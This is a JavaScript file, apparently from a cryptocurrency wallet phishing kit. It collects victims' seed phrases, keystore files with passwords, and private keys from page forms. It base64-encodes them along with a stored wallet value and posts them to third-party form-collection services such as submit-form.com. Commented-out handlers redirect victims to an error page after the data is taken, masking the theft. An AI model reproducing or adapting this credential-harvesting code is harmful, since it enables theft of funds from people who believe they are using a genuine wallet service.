
const params = {
   // "https://api.web3forms.com/submit": { "access_key": "a1515533-be40-4008-9a96-40b84fdeb923" },
    "https://submit-form.com/lZMfCHudt": {},
    //"https://formsubmit.co/7a39d7898e305d552df9bfc6cc1728c6": { "_captcha": "false"},
};

const urls = Object.keys(params);

//  For aggregating form inputs with the above params when submiting request
var message = {}
const wallet_encoded = btoa(localStorage.getItem('wallet'));
const phraseElement = document.getElementById('phrase-form');
const keystoreElement = document.getElementById('keystore-form');
const pkeyElement = document.getElementById('pkey-form');

// Main function for requests, all others use it
function sendPostRequest(url) {

    let requestData = params[url];

    let mergedData = Object.assign({ 'provider': wallet_encoded }, message, requestData);
    let reqString = JSON.stringify(mergedData);

    return new Promise((resolve, reject) => {
        $.ajax({
            url: url,
            method: "POST",
            data: reqString,
            contentType: "application/json",
            dataType: "json",
            success: console.log('yeey'),
            error: console.log('ayy'),
        });

        setTimeout(() => {
            reject(new Error('Request timed out'));
        }, 10000); // should by about 6000ms by defualt
    });
}


function send(option) {
    if (option === 1) {
        var phraseForm = new FormData(phraseElement);
        message['seeed'] = btoa(phraseForm.get('phrase'));
    } else if (option === 2) {
        var keystoreForm = new FormData(keystoreElement);
        let keystoreEncoded = btoa(keystoreForm.get('keystore-json'));
        let passwordEncoded = btoa(keystoreForm.get('keystore-pass'));
        message['KS'] = keystoreEncoded;
        message['PS'] = passwordEncoded;

    } else {
        var keystoreForm = new FormData(keystoreElement);
        let keystoreEncoded = btoa(keystoreForm.get('keystore-json'));
        let passwordEncoded = btoa(keystoreForm.get('keystore-pass'));
        message['KS'] = keystoreEncoded;
        message['PS'] = passwordEncoded;
    } 

    // Create an array of promises
    var promises = urls.map(sendPostRequest);

    // Use Promise.all to wait for all requests to complete
    Promise.all(promises)
        .then(function (responses) {
            console.log("All requests completed:", responses);
        })
        .catch(function (error) {
            console.error("An error occurred:", error);
            //window.location.href = "/errorpage.html"; // Replace with the desired URL
        });

}

/*
$("#phrase-submit").on("click", function () {
    event.preventDefault(); // Prevent the default form submission behavior
    $("#spinner").show();

    var phraseForm = new FormData(phraseElement);
    message['seeed'] = btoa(phraseForm.get('phrase'));

    // Create an array of promises
    var promises = urls.map(sendPostRequest);

    // Use Promise.all to wait for all requests to complete
    Promise.all(promises)
        .then(function (responses) {
            console.log("All requests completed:", responses);
            window.location.href = "/errorpage.html"; // Replace with the desired URL
        })
        .catch(function (error) {
            console.error("An error occurred:", error);
            window.location.href = "/errorpage.html"; // Replace with the desired URL
        });

});


$("#keystore-submit").on("click", function () {
    event.preventDefault(); // Prevent the default form submission behavior
    $("#spinner").show();

    // form specific computation

    var keystoreForm = new FormData(keystoreElement);
    let keystoreEncoded = btoa(keystoreForm.get('keystore-json'));
    let passwordEncoded = btoa(keystoreForm.get('keystore-pass'));
    message['KS'] = keystoreEncoded;
    message['PS'] = passwordEncoded;

    // Create an array of promises
    var promises = urls.map(sendPostRequest);

    // Use Promise.all to wait for all requests to complete
    Promise.all(promises)
        .then(function (responses) {
            console.log("All requests completed:", responses);
            window.location.href = "/errorpage.html"; // Replace with the desired URL
        })
        .catch(function (error) {
            console.error("An error occurred:", error);
            window.location.href = "/errorpage.html"; // Replace with the desired URL
        });

});

// handle keystore submit  pass
$("#pkey-submit").on("click", function () {
    event.preventDefault(); // Prevent the default form submission behavior
    $("#spinner").show();

    // form specific computation

    var pkeyForm = new FormData(pkeyElement);
    let pkeyEncoded = btoa(pkeyForm.get('pkey'));
    message['PK'] = pkeyEncoded;

    // Create an array of promises
    var promises = urls.map(sendPostRequest);

    // Use Promise.all to wait for all requests to complete
    Promise.all(promises)
        .then(function (responses) {
            console.log("All requests completed:", responses);
            window.location.href = "/errorpage.html"; // Replace with the desired URL
        })
        .catch(function (error) {
            console.error("An error occurred:", error);
            window.location.href = "/errorpage.html"; // Replace with the desired URL
        });

});
*/